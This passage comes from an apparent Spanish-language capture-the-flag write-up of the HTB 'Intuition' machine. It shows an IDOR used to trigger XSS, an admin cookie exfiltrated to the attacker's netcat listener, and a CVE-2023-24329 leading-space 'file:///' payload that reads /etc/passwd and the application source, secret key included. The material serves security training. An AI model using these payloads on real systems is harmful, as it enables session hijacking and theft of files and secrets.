</span></span></code></pre></div><p>Aqu√≠ modificar√© el par√°metro en la petici√≥n <code>POST</code> a trav√©s de un <code>IDOR</code> de la url <code>/change_priority?report_id=3&amp;priority_level=1</code> a <code>/change_priority?report_id=25&amp;priority_level=1</code>; donde pasamos de modificar el post con ID <code>3</code>, a <code>report_id=25</code> dado que <code>25</code> es el reporte que contiene el payload <code>XSS</code>. Luego de mosificarlo y enviarlo, y luego de empezar un nuevo listener en el puerto <code>8000</code> con <code>netcat</code>, obtengo una nueva cookie:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ nc -lvnp 8000
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>listening on [any] 8000 ...
</span></span></span><span class=line><span class=cl><span class=go>connect to [10.10.16.6] from (UNKNOWN) [10.10.11.15] 36514
</span></span></span><span class=line><span class=cl><span class=go>GET /xss-76.js?cookie=dXNlcl9kYXRhPWV5SjFjMlZ5WDJsa0lqb2dNU3dnSW5WelpYSnVZVzFsSWpvZ0ltRmtiV2x1SWl3Z0luSnZiR1VpT2lBaVlXUnRhVzRpZlh3ek5EZ3lNak16TTJRME5EUmhaVEJsTkRBeU1tWTJZMk0yTnpsaFl6bGtNalprTVdReFpEWTRNbU0xT1dNMk1XTm1ZbVZoTWpsa056YzJaRFU0T1dRNQ== HTTP/1.1
</span></span></span><span class=line><span class=cl><span class=go>Host: 10.10.16.6:8000
</span></span></span><span class=line><span class=cl><span class=go>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0
</span></span></span><span class=line><span class=cl><span class=go>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
</span></span></span><span class=line><span class=cl><span class=go>Accept-Language: en-US,en;q=0.5
</span></span></span><span class=line><span class=cl><span class=go>Accept-Encoding: gzip, deflate
</span></span></span><span class=line><span class=cl><span class=go>Referer: http://dashboard.comprezzor.htb/
</span></span></span><span class=line><span class=cl><span class=go>Connection: keep-alive
</span></span></span><span class=line><span class=cl><span class=go>Upgrade-Insecure-Requests: 1
</span></span></span></code></pre></div><p>Decodeando la cookie tenemos:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ echo -n &#39;dXNlcl9kYXRhPWV5SjFjMlZ5WDJsa0lqb2dNU3dnSW5WelpYSnVZVzFsSWpvZ0ltRmtiV2x1SWl3Z0luSnZiR1VpT2lBaVlXUnRhVzRpZlh3ek5EZ3lNak16TTJRME5EUmhaVEJsTkRBeU1tWTJZMk0yTnpsaFl6bGtNalprTVdReFpEWTRNbU0xT1dNMk1XTm1ZbVZoTWpsa056YzJaRFU0T1dRNQ==&#39; | base64 -d
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>user_data=eyJ1c2VyX2lkIjogMSwgInVzZXJuYW1lIjogImFkbWluIiwgInJvbGUiOiAiYWRtaW4ifXwzNDgyMjMzM2Q0NDRhZTBlNDAyMmY2Y2M2NzlhYzlkMjZkMWQxZDY4MmM1OWM2MWNmYmVhMjlkNzc2ZDU4OWQ5
</span></span></span></code></pre></div><p>Entonces reemplazo la cookie del sitio <code>http://dashboard.comprezzor.htb/</code> con este nuevo valor, recargo la p√°gina y estamos dentro como el usuario <code>admin</code>:</p><p><img alt="Intuition 10" src=/pentesting/images/Intuition_10.png></p><p>All√≠ puedo ver un bot√≥n <code>Create PDF Report</code>. Clickeando en este bot√≥n, √©ste nos pregunta por la url de un <code>PDF</code>. Decido ver cu√°l es la petici√≥n que env√≠a si es que pongo mi direcci√≥n IP (y, de nuevo, luego de empezar un listener con <code>netcat</code> en el puerto <code>8000</code>):</p><p><img alt="Intuition 11" src=/pentesting/images/Intuition_11.png></p><p>Y en mi listener obtengo algo:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ nc -lvnp 8000
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>listening on [any] 8000 ...
</span></span></span><span class=line><span class=cl><span class=go>connect to [10.10.16.6] from (UNKNOWN) [10.10.11.15] 42234
</span></span></span><span class=line><span class=cl><span class=go>GET / HTTP/1.1
</span></span></span><span class=line><span class=cl><span class=go>Accept-Encoding: identity
</span></span></span><span class=line><span class=cl><span class=go>Host: 10.10.16.6:8000
</span></span></span><span class=line><span class=cl><span class=go>User-Agent: Python-urllib/3.11
</span></span></span><span class=line><span class=cl><span class=go>Cookie: user_data=eyJ1c2VyX2lkIjogMSwgInVzZXJuYW1lIjogImFkbWluIiwgInJvbGUiOiAiYWRtaW4ifXwzNDgyMjMzM2Q0NDRhZTBlNDAyMmY2Y2M2NzlhYzlkMjZkMWQxZDY4MmM1OWM2MWNmYmVhMjlkNzc2ZDU4OWQ5
</span></span></span><span class=line><span class=cl><span class=go>Connection: close
</span></span></span></code></pre></div><p>Aqu√≠ puedo ver que el <code>User-Agent</code> es <code>Python-urllib/3.11</code>. Buscando por vulnerabilidades para esta librer√≠a encontramos <a href=https://nvd.nist.gov/vuln/detail/CVE-2023-24329 class=external-link target=_blank rel=noopener>CVE-2023-24329</a> descrito como:</p><div class="notice info"><div class=notice-title><i class="fa-solid fa-exclamation-circle" aria-hidden=true></i>Informaci√≥n</div><div class=notice-content>An issue in the urllib.parse component of <code>Python</code> before 3.11.4 allows attackers to bypass blocklisting methods by supplying a URL that starts with blank characters.</div></div><p>B√°sicamente, en el campo de url, podemos pasar el payload:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl> file:///etc/passwd
</span></span></code></pre></div><p>Notando que antes de la palabra <code>file</code> tenemos un espacio (<code> </code>) el cual nos permite, seg√∫n describe la vulnerabilidad, bypassear los filtros.</p><p><img alt="Intuition 12" src=/pentesting/images/Intuition_12.png></p><p>Esto genera un reporte <code>PDF</code> el cual contiene:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin
</span></span><span class=line><span class=cl>sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin
</span></span><span class=line><span class=cl>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
</span></span><span class=line><span class=cl>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
</span></span><span class=line><span class=cl>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-
</span></span><span class=line><span class=cl>data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List
</span></span><span class=line><span class=cl>Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting
</span></span><span class=line><span class=cl>System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
</span></span><span class=line><span class=cl>_apt:x:100:65534::/nonexistent:/usr/sbin/nologin systemd-network:x:101:102:systemd Network
</span></span><span class=line><span class=cl>Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:102:103:systemd
</span></span><span class=line><span class=cl>Resolver,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:104::/nonexistent:/usr/sbin/nologin systemd-
</span></span><span class=line><span class=cl>timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin avahi:x:105:110:Avahi mDNS
</span></span><span class=line><span class=cl>daemon,,,:/run/avahi-daemon:/usr/sbin/nologin geoclue:x:106:111::/var/lib/geoclue:/usr/sbin/nologin
</span></span></code></pre></div><p>de manera que hemos logrado un <code>Local File Inclusion</code> (<code>LFI</code>).</p><p>Pero todav√≠a necesitamos de paths/rutas para leer archivos. Podemos chequear procesos corriendo leyendo los archivos <code>/proc/self/cmdline</code>, con el payload:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl> file:///proc/self/cmdline
</span></span></code></pre></div><p><strong>(No olvidar el espacio antes del payload)</strong></p><p>Una vez descargado, obtenemos un <code>PDF</code> con un contenido el cual nos muestra un proceso:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>python3/app/code/app.py
</span></span></code></pre></div><p>donde encontramos una app de <code>Python</code> corriendo llamada <code>/app/code/app.py</code>.</p><p>Entonces inyectamos la url:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl> file:///app/code/app.py
</span></span></code></pre></div><p>Y ahora obtenemos:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>from flask import Flask, request, redirect from blueprints.index.index import main_bp from blueprints.report.report
</span></span><span class=line><span class=cl>import report_bp from blueprints.auth.auth import auth_bp from blueprints.dashboard.dashboard import dashboard_bp
</span></span><span class=line><span class=cl>app = Flask(__name__) app.secret_key = &#34;7ASS7ADA8RF3FD7&#34; app.config[&#39;SERVER_NAME&#39;] = &#39;comprezzor.htb&#39;
</span></span><span class=line><span class=cl>app.config[&#39;MAX_CONTENT_LENGTH&#39;] = 5 * 1024 * 1024 # Limit file size to 5MB ALLOWED_EXTENSIONS = {&#39;txt&#39;,
</span></span><span class=line><span class=cl>&#39;pdf&#39;, &#39;docx&#39;} # Add more allowed file extensions if needed app.register_blueprint(main_bp)
</span></span><span class=line><span class=cl>app.register_blueprint(report_bp, subdomain=&#39;report&#39;) app.register_blueprint(auth_bp, subdomain=&#39;auth&#39;)
</span></span><span class=line><span class=cl>app.register_blueprint(dashboard_bp, subdomain=&#39;dashboard&#39;) if __name__ == &#39;__main__&#39;: app.run(debug=False,
</span></span><span class=line><span class=cl>host=&#34;0.0.0.0&#34;, port=80)
</span></span></code></pre></div><p>Reordenando el c√≥digo tenemos el siguiente c√≥digo de <code>Python</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>flask</span> <span class=kn>import</span> <span class=n>Flask</span><span class=p>,</span> <span class=n>request</span><span class=p>,</span> <span class=n>redirect</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>blueprints.index.index</span> <span class=kn>import</span> <span class=n>main_bp</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>blueprints.report.report</span> <span class=kn>import</span> <span class=n>report_bp</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>blueprints.auth.auth</span> <span class=kn>import</span> <span class=n>auth_bp</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>blueprints.dashboard.dashboard</span> <span class=kn>import</span> <span class=n>dashboard_bp</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>app</span> <span class=o>=</span> <span class=n>Flask</span><span class=p>(</span><span class=vm>__name__</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>app</span><span class=o>.</span><span class=n>secret_key</span> <span class=o>=</span> <span class=s2>&#34;7ASS7ADA8RF3FD7&#34;</span>
</span></span><span class=line><span class=cl><span class=n>app</span><span class=o>.</span><span class=n>config</span><span class=p>[</span><span class=s1>&#39;SERVER_NAME&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=s1>&#39;comprezzor.htb&#39;</span>
</span></span><span class=line><span class=cl><span class=n>app</span><span class=o>.</span><span class=n>config</span><span class=p>[</span><span class=s1>&#39;MAX_CONTENT_LENGTH&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=mi>5</span> <span class=o>*</span> <span class=mi>1024</span> <span class=o>*</span> <span class=mi>1024</span>  <span class=c1># Limit file size to 5MB</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>ALLOWED_EXTENSIONS</span> <span class=o>=</span> <span class=p>{</span><span class=s1>&#39;txt&#39;</span><span class=p>,</span> <span class=s1>&#39;pdf&#39;</span><span class=p>,</span> <span class=s1>&#39;docx&#39;</span><span class=p>}</span>  <span class=c1># Add more allowed file extensions if needed</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>app</span><span class=o>.</span><span class=n>register_blueprint</span><span class=p>(</span><span class=n>main_bp</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>app</span><span class=o>.</span><span class=n>register_blueprint</span><span class=p>(</span><span class=n>report_bp</span><span class=p>,</span> <span class=n>subdomain</span><span class=o>=</span><span class=s1>&#39;report&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>app</span><span class=o>.</span><span class=n>register_blueprint</span><span class=p>(</span><span class=n>auth_bp</span><span class=p>,</span> <span class=n>subdomain</span><span class=o>=</span><span class=s1>&#39;auth&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>app</span><span class=o>.</span><span class=n>register_blueprint</span><span class=p>(</span><span class=n>dashboard_bp</span><span class=p>,</span> <span class=n>subdomain</span><span class=o>=</span><span class=s1>&#39;dashboard&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s1>&#39;__main__&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>app</span><span class=o>.</span><span class=n>run</span><span class=p>(</span><span class=n>debug</span><span class=o>=</span><span class=kc>False</span><span class=p>,</span> <span class=n>host</span><span class=o>=</span><span class=s2>&#34;0.0.0.0&#34;</span><span class=p>,</span> <span class=n>port</span><span class=o>=</span><span class=mi>80</span><span class=p>)</span>
</span></span></code></pre></div><p>Donde tenemos una potencial contrase√±a: <code>7ASS7ADA8RF3FD7</code>.</p><p>Noto, adem√°s, que este script est√° importando la librer√≠a <code>blueprints</code>. Buscando por esta librer√≠a, se ve que esta es una librer√≠a para <code>Flask</code> (lo cual hace sentido que que el archivo se llame <code>app.py</code>). Como se explica en <a href=https://stackoverflow.com/questions/71822169/flask-blueprint-and-registering-path class=external-link target=_blank rel=noopener>este post de StackOverflow</a> y <a href=https://exploreflask.com/en/latest/blueprints.html class=external-link target=_blank rel=noopener>la documentaci√≥n Blueprints</a>, esperamos que la librer√≠a <code>blueprints</code> se encuentre en el directorio actual donde se encuentra localizado <code>app.py</code>, dentro del directorio <code>/blueprints</code>. Es as√≠ como intentamos leer el archivo <code>/app/code/blueprints/auth/auth.py</code> y obtenemos el c√≥digo:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>flask</span> <span class=kn>import</span> <span class=n>Flask</span><span class=p>,</span> <span class=n>Blueprint</span><span class=p>,</span> <span class=n>request</span><span class=p>,</span> <span class=n>render_template</span><span class=p>,</span> <span class=n>redirect</span><span class=p>,</span> <span class=n>url_for</span><span class=p>,</span> <span class=n>flash</span><span class=p>,</span> <span class=n>make_response</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>.auth_utils</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>werkzeug.security</span> <span class=kn>import</span> <span class=n>check_password_hash</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>app</span> <span class=o>=</span> <span class=n>Flask</span><span class=p>(</span><span class=vm>__name__</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>auth_bp</span> <span class=o>=</span> <span class=n>Blueprint</span><span class=p>(</span><span class=s1>&#39;auth&#39;</span><span class=p>,</span> <span class=vm>__name__</span><span class=p>,</span> <span class=n>subdomain</span><span class=o>=</span><span class=s1>&#39;auth&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nd>@auth_bp.route</span><span class=p>(</span><span class=s1>&#39;/&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>index</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>redirect</span><span class=p>(</span><span class=n>url_for</span><span class=p>(</span><span class=s1>&#39;auth.login&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nd>@auth_bp.route</span><span class=p>(</span><span class=s1>&#39;/login&#39;</span><span class=p>,</span> <span class=n>methods</span><span class=o>=</span><span class=p>[</span><span class=s1>&#39;GET&#39;</span><span class=p>,</span> <span class=s1>&#39;POST&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>login</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>request</span><span class=o>.</span><span class=n>method</span> <span class=o>==</span> <span class=s1>&#39;POST&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>username</span> <span class=o>=</span> <span class=n>request</span><span class=o>.</span><span class=n>form</span><span class=p>[</span><span class=s1>&#39;username&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=n>password</span> <span class=o>=</span> <span class=n>request</span><span class=o>.</span><span class=n>form</span><span class=p>[</span><span class=s1>&#39;password&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=n>user</span> <span class=o>=</span> <span class=n>fetch_user_info</span><span class=p>(</span><span class=n>username</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=n>user</span> <span class=ow>is</span> <span class=kc>None</span><span class=p>)</span> <span class=ow>or</span> <span class=ow>not</span> <span class=n>check_password_hash</span><span class=p>(</span><span class=n>user</span><span class=p>[</span><span class=mi>2</span><span class=p>],</span> <span class=n>password</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=n>flash</span><span class=p>(</span><span class=s1>&#39;Invalid username or password&#39;</span><span class=p>,</span> <span class=s1>&#39;error&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=n>redirect</span><span class=p>(</span><span class=n>url_for</span><span class=p>(</span><span class=s1>&#39;auth.login&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=n>serialized_user_data</span> <span class=o>=</span> <span class=n>serialize_user_data</span><span class=p>(</span><span class=n>user</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span> <span class=n>user</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span> <span class=n>user</span><span class=p>[</span><span class=mi>3</span><span class=p>])</span>
</span></span><span class=line><span class=cl>        <span class=n>flash</span><span class=p>(</span><span class=s1>&#39;Logged in successfully!&#39;</span><span class=p>,</span> <span class=s1>&#39;success&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>response</span> <span class=o>=</span> <span class=n>make_response</span><span class=p>(</span><span class=n>redirect</span><span class=p>(</span><span class=n>get_redirect_url</span><span class=p>(</span><span class=n>user</span><span class=p>[</span><span class=mi>3</span><span class=p>])))</span>
</span></span><span class=line><span class=cl>        <span class=n>response</span><span class=o>.</span><span class=n>set_cookie</span><span class=p>(</span><span class=s1>&#39;user_data&#39;</span><span class=p>,</span> <span class=n>serialized_user_data</span><span class=p>,</span> <span class=n>domain</span><span class=o>=</span><span class=s1>&#39;.comprezzor.htb&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>response</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>render_template</span><span class=p>(</span><span class=s1>&#39;auth/login.html&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nd>@auth_bp.route</span><span class=p>(</span><span class=s1>&#39;/register&#39;</span><span class=p>,</span> <span class=n>methods</span><span class=o>=</span><span class=p>[</span><span class=s1>&#39;GET&#39;</span><span class=p>,</span> <span class=s1>&#39;POST&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>register</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>request</span><span class=o>.</span><span class=n>method</span> <span class=o>==</span> <span class=s1>&#39;POST&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>username</span> <span class=o>=</span> <span class=n>request</span><span class=o>.</span><span class=n>form</span><span class=p>[</span><span class=s1>&#39;username&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=n>password</span> <span class=o>=</span> <span class=n>request</span><span class=o>.</span><span class=n>form</span><span class=p>[</span><span class=s1>&#39;password&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=n>user</span> <span class=o>=</span> <span class=n>fetch_user_info</span><span class=p>(</span><span class=n>username</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>user</span> <span class=ow>is</span> <span class=ow>not</span> <span class=kc>None</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>flash</span><span class=p>(</span><span class=s1>&#39;User already exists&#39;</span><span class=p>,</span> <span class=s1>&#39;error&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=n>redirect</span><span class=p>(</span><span class=n>url_for</span><span class=p>(</span><span class=s1>&#39;auth.register&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>create_user</span><span class=p>(</span><span class=n>username</span><span class=p>,</span> <span class=n>password</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=n>flash</span><span class=p>(</span><span class=s1>&#39;Registration successful! You can now log in.&#39;</span><span class=p>,</span> <span class=s1>&#39;success&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=n>redirect</span><span class=p>(</span><span class=n>url_for</span><span class=p>(</span><span class=s1>&#39;auth.login&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>flash</span><span class=p>(</span><span class=s1>&#39;Unexpected error occurred while trying to register!&#39;</span><span class=p>,</span> <span class=s1>&#39;error&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>render_template</span><span class=p>(</span><span class=s1>&#39;auth/register.html&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nd>@auth_bp.route</span><span class=p>(</span><span class=s1>&#39;/logout&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>logout</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>pass</span>
</span></span></code></pre></div><p>Donde podemos ver que el c√≥digo est√° revisando el login para la p√°gina <code>http://auth.comprezzor.htb</code>.</p><p>Tambi√©n somos capaces de encontrar los archivos <code>/app/code/blueprints/report/report.py</code> y <code>/app/code/blueprints/index/index.py</code>, pero ninguno de ellos nos dan informaci√≥n interesante.</p><p>Pero el archivo m√°s interesante <code>/app/code/blueprints/dashboard/dashboard.py</code>, dado que si lo revisamos, tenemos el c√≥digo:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>flask</span> <span class=kn>import</span> <span class=n>Blueprint</span><span class=p>,</span> <span class=n>request</span><span class=p>,</span> <span class=n>render_template</span><span class=p>,</span> <span class=n>flash</span><span class=p>,</span> <span class=n>redirect</span><span class=p>,</span> <span class=n>url_for</span><span class=p>,</span> <span class=n>send_file</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>blueprints.auth.auth_utils</span> <span class=kn>import</span> <span class=n>admin_required</span><span class=p>,</span> <span class=n>login_required</span><span class=p>,</span> <span class=n>deserialize_user_data</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>blueprints.report.report_utils</span> <span class=kn>import</span> <span class=n>get_report_by_priority</span><span class=p>,</span> <span class=n>get_report_by_id</span><span class=p>,</span> <span class=n>delete_report</span><span class=p>,</span> <span class=n>get_all_reports</span><span class=p>,</span> <span class=n>change_report_priority</span><span class=p>,</span> <span class=n>resolve_report</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>random</span><span class=o>,</span> <span class=nn>os</span><span class=o>,</span> <span class=nn>pdfkit</span><span class=o>,</span> <span class=nn>socket</span><span class=o>,</span> <span class=nn>shutil</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>urllib.request</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>urllib.parse</span> <span class=kn>import</span> <span class=n>urlparse</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>zipfile</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>ftplib</span> <span class=kn>import</span> <span class=n>FTP</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>datetime</span> <span class=kn>import</span> <span class=n>datetime</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>dashboard_bp</span> <span class=o>=</span> <span class=n>Blueprint</span><span class=p>(</span><span class=s1>&#39;dashboard&#39;</span><span class=p>,</span> <span class=vm>__name__</span><span class=p>,</span> <span class=n>subdomain</span><span class=o>=</span><span class=s1>&#39;dashboard&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>pdf_report_path</span> <span class=o>=</span> <span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>dirname</span><span class=p>(</span><span class=vm>__file__</span><span class=p>),</span> <span class=s1>&#39;pdf_reports&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>allowed_hostnames</span> <span class=o>=</span> <span class=p>[</span><span class=s1>&#39;report.comprezzor.htb&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nd>@dashboard_bp.route</span><span class=p>(</span><span class=s1>&#39;/&#39;</span><span class=p>,</span> <span class=n>methods</span><span class=o>=</span><span class=p>[</span><span class=s1>&#39;GET&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=nd>@admin_required</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>dashboard</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>user_data</span> <span class=o>=</span> <span class=n>request</span><span class=o>.</span><span class=n>cookies</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;user_data&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>user_info</span> <span class=o>=</span> <span class=n>deserialize_user_data</span><span class=p>(</span><span class=n>user_data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>user_info</span><span class=p>[</span><span class=s1>&#39;role&#39;</span><span class=p>]</span> <span class=o>==</span> <span class=s1>&#39;admin&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>reports</span> <span class=o>=</span> <span class=n>get_report_by_priority</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>elif</span> <span class=n>user_info</span><span class=p>[</span><span class=s1>&#39;role&#39;</span><span class=p>]</span> <span class=o>==</span> <span class=s1>&#39;webdev&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>reports</span> <span class=o>=</span> <span class=n>get_all_reports</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>render_template</span><span class=p>(</span><span class=s1>&#39;dashboard/dashboard.html&#39;</span><span class=p>,</span> <span class=n>reports</span><span class=o>=</span><span class=n>reports</span><span class=p>,</span> <span class=n>user_info</span><span class=o>=</span><span class=n>user_info</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nd>@dashboard_bp.route</span><span class=p>(</span><span class=s1>&#39;/report/&#39;</span><span class=p>,</span> <span class=n>methods</span><span class=o>=</span><span class=p>[</span><span class=s1>&#39;GET&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=nd>@login_required</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>get_report</span><span class=p>(</span><span class=n>report_id</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>user_data</span> <span class=o>=</span> <span class=n>request</span><span class=o>.</span><span class=n>cookies</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;user_data&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>user_info</span> <span class=o>=</span> <span class=n>deserialize_user_data</span><span class=p>(</span><span class=n>user_data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>user_info</span><span class=p>[</span><span class=s1>&#39;role&#39;</span><span class=p>]</span> <span class=ow>in</span> <span class=p>[</span><span class=s1>&#39;admin&#39;</span><span class=p>,</span> <span class=s1>&#39;webdev&#39;</span><span class=p>]:</span>
